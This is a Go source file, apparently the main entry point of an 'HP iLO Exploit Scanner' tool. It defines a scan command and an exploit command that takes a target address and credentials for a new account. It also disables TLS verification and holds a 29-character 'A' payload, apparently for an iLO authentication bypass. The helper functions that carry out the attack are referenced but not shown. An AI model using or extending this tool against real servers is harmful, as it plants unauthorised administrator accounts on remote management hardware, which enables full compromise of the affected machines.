package main

import (
	"crypto/tls"
	"net/http"
	"os"

	"gopkg.in/alecthomas/kingpin.v2"
)

var (
	app = kingpin.New(os.Args[0], "HP iLO Exploit Scanner")

	t      = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client = &http.Client{Transport: t}

	addr, user, pw string
	magic          = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" //A*29
)

func main() {
	app.GetFlag("help").Short('h')

	// commands
	scan := app.Command("scan", "iLO Vulnerability Scanner")
	scan.Arg("Address", "The Address to scan").Required().StringVar(&addr)
	scan.Action(iloScan)

	exploit := app.Command("exploit", "iLO Vunerability Exploiter")
	exploit.Arg("Address", "The Address to exploit").Required().StringVar(&addr)
	exploit.Arg("Username", "New account username").Required().StringVar(&user)
	exploit.Arg("Password", "New account password").Required().StringVar(&pw)
	exploit.Action(iloExploit)

	// Parse and execute
	_, err := app.Parse(os.Args[1:])
	if err != nil {
		kingpin.Fatalf("%v\n", err)
	}
}
